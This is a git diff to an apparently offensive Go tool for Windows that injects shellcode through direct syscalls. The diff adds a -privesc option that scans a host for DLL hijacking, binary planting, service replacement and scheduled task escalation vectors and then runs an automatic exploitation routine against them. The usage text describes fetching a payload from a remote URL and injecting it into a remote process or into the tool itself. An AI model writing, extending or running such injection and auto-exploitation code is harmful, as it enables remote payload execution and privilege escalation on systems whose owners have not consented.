@@ -18,7 +18,13 @@ import (
 	"github.com/carved4/go-direct-syscall/pkg/debug"
 )
 
-
+// i made this project for go 1.20 and im sticking with it i cannot believe there is no built in min function pre 1.21
+func min(a, b int) int {
+	if a < b {
+		return a
+	}
+	return b
+}
 
 // getEmbeddedShellcode returns the embedded calc shellcode as bytes
 func getEmbeddedShellcode() []byte {
@@ -323,6 +329,7 @@ func main() {
 	dumpFlag := flag.Bool("dump", false, "Dump all available syscalls from ntdll.dll")
 	selfFlag := flag.Bool("self", false, "Use self-injection instead of remote process injection")
 	debugFlag := flag.Bool("debug", false, "Enable debug logging for all operations")
+	privescFlag := flag.Bool("privesc", false, "Scan for privilege escalation vectors and test exploitation (no files created)")
 
 	flag.Parse()
 
@@ -330,6 +337,87 @@ func main() {
 	if *debugFlag {
 		debug.SetDebugMode(true)
 		debug.Printfln("MAIN", "Debug mode enabled\n")
+	}
+
+	// Check if privesc flag is used
+	if *privescFlag {
+		debug.Printfln("MAIN", "Starting privilege escalation vector scan and testing...\n")
+		debug.Printfln("MAIN", "%s\n", "=" + strings.Repeat("=", 79))
+		
+		// Scan for privilege escalation vectors
+		debug.Printfln("MAIN", "Scanning for privilege escalation vectors...\n")
+		escMap, err := winapi.ScanPrivilegeEscalationVectors()
+		if err != nil {
+			debug.Printfln("MAIN", "Failed to scan vectors: %v\n", err)
+			os.Exit(1)
+		}
+		
+		// Display summary
+		debug.Printfln("MAIN", "\n=== Privilege Escalation Scan Results ===\n")
+		debug.Printfln("MAIN", "Total vectors found: %d\n", escMap.Summary.TotalVectors)
+		debug.Printfln("MAIN", "Critical: %d, High: %d, Medium: %d, Low: %d\n", 
+			escMap.Summary.CriticalCount, escMap.Summary.HighCount, 
+			escMap.Summary.MediumCount, escMap.Summary.LowCount)
+		debug.Printfln("MAIN", "Exploitable vectors: %d\n", escMap.Summary.ExploitableCount)
+		
+		if escMap.Summary.TotalVectors > 0 {
+			// Display vector details
+			debug.Printfln("MAIN", "\n=== Vector Details ===\n")
+			
+			if len(escMap.DllHijacking) > 0 {
+				debug.Printfln("MAIN", "DLL Hijacking (%d):\n", len(escMap.DllHijacking))
+				for _, v := range escMap.DllHijacking[:min(5, len(escMap.DllHijacking))] {
+					debug.Printfln("MAIN", "  [%s] %s - %s\n", v.Severity, v.Path, v.Description)
+				}
+			}
+			
+			if len(escMap.BinaryPlanting) > 0 {
+				debug.Printfln("MAIN", "Binary Planting (%d):\n", len(escMap.BinaryPlanting))
+				for _, v := range escMap.BinaryPlanting[:min(5, len(escMap.BinaryPlanting))] {
+					debug.Printfln("MAIN", "  [%s] %s - %s\n", v.Severity, v.Path, v.Description)
+				}
+			}
+			
+			if len(escMap.ServiceReplace) > 0 {
+				debug.Printfln("MAIN", "Service Replace (%d):\n", len(escMap.ServiceReplace))
+				for _, v := range escMap.ServiceReplace[:min(5, len(escMap.ServiceReplace))] {
+					debug.Printfln("MAIN", "  [%s] %s - %s\n", v.Severity, v.Path, v.Description)
+				}
+			}
+			
+			if len(escMap.TaskScheduler) > 0 {
+				debug.Printfln("MAIN", "Task Scheduler (%d):\n", len(escMap.TaskScheduler))
+				for _, v := range escMap.TaskScheduler[:min(5, len(escMap.TaskScheduler))] {
+					debug.Printfln("MAIN", "  [%s] %s - %s\n", v.Severity, v.Path, v.Description)
+				}
+			}
+			
+			// Test exploitation in safe mode (no files created)
+			debug.Printfln("MAIN", "\n=== Testing Exploitation Vectors (Safe Mode) ===\n")
+			testPayload := winapi.GenerateTestPayload()
+			session := winapi.AutoExploit(escMap, testPayload, true) // testMode = true
+			
+			debug.Printfln("MAIN", "Exploitation test results:\n")
+			debug.Printfln("MAIN", "Tested: %d, Success: %d, Failed: %d\n", 
+				session.Tested, session.Success, session.Failed)
+			
+			if len(session.Results) > 0 {
+				debug.Printfln("MAIN", "\nTest Details:\n")
+				for i, result := range session.Results[:min(10, len(session.Results))] {
+					status := "FAIL"
+					if result.Success {
+						status = "PASS"
+					}
+					debug.Printfln("MAIN", "%d. [%s] %s (%s) - %s\n", 
+						i+1, status, result.Vector.Path, result.Method, result.Description)
+				}
+			}
+		} else {
+			debug.Printfln("MAIN", "No privilege escalation vectors found.\n")
+		}
+		
+		debug.Printfln("MAIN", "\n✓ Privilege escalation scan completed\n")
+		return
 	}
 
 	// Check if dump flag is used
@@ -435,12 +523,13 @@ func main() {
 		url := *urlFlag
 		if url == "" {
 			// This is an error condition, so we always show it regardless of debug mode
-			fmt.Println("Error: You must specify either -url, -example, or -dump flag")
+			fmt.Println("Error: You must specify either -url, -example, -dump, or -privesc flag")
 			fmt.Println("Usage:")
 			fmt.Println("  ./go-direct-syscall.exe -url http://example.com/payload.bin                    # Remote injection")
 			fmt.Println("  ./go-direct-syscall.exe -url http://example.com/payload.bin -self             # Self injection")
 			fmt.Println("  ./go-direct-syscall.exe -example                                              # Self injection with embedded calc")
 			fmt.Println("  ./go-direct-syscall.exe -dump                                                 # Dump syscalls")
+			fmt.Println("  ./go-direct-syscall.exe -privesc                                              # Scan for privilege escalation vectors")
 			fmt.Println("  ./go-direct-syscall.exe -debug -example                                       # Self injection with debug logging")
 			os.Exit(1)
 		}
